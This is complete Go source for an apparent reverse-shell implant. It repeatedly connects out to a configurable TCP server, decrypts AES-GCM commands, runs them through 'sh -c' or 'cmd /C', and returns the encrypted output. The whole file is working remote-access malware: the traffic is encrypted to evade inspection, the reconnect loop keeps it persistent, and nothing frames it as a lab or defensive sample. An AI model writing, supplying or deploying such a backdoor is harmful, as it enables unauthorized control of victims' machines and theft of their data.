package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
	"time"
)

var (
	host = flag.String("host", "192.168.1.14:9000", "server address")
	key  = flag.String("key", "0123456789abcdef0123456789abcdef", "32-byte AES key")
)

func encrypt(plain []byte, block cipher.Block) ([]byte, error) {
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plain, nil), nil
}

func decrypt(data []byte, block cipher.Block) ([]byte, error) {
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ct := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, nil)
}

func main() {
	flag.Parse()
	raw := []byte(*key)
	if len(raw) != 32 {
		log.Fatalf("Key length: %d, want 32", len(raw))
	}
	block, err := aes.NewCipher(raw)
	if err != nil {
		log.Fatalf("AES init: %v", err)
	}

	for {
		conn, err := net.Dial("tcp", *host)
		if err != nil {
			log.Printf("Connect error: %v. Retrying in 5s...", err)
			time.Sleep(5 * time.Second)
			continue
		}
		log.Printf("Connected to %s", *host)
		// communication loop
		for {
			var head [4]byte
			if _, err := io.ReadFull(conn, head[:]); err != nil {
				break
			}
			sz := binary.BigEndian.Uint32(head[:])
			data := make([]byte, sz)
			if _, err := io.ReadFull(conn, data); err != nil {
				break
			}
			// decrypt and execute
			cmdBytes, err := decrypt(data, block)
			if err != nil {
				log.Printf("decrypt cmd: %v", err)
				continue
			}
			cmd := string(cmdBytes)
			if cmd == "exit" {
				conn.Close()
				return
			}
			var execCmd *exec.Cmd
			if runtime.GOOS == "windows" {
				execCmd = exec.Command("cmd", "/C", cmd)
			} else {
				execCmd = exec.Command("sh", "-c", cmd)
			}
			output, err := execCmd.CombinedOutput()
			if err != nil {
				output = append(output, []byte(fmt.Sprintf("\n[error] %v", err))...)
			}
			// encrypt response
			enc, err := encrypt(output, block)
			if err != nil {
				log.Printf("encrypt resp: %v", err)
				continue
			}
			var r [4]byte
			binary.BigEndian.PutUint32(r[:], uint32(len(enc)))
			conn.Write(r[:])
			conn.Write(enc)
		}
		conn.Close()
		log.Println("Disconnected. Retrying...")
		time.Sleep(5 * time.Second)
	}
}
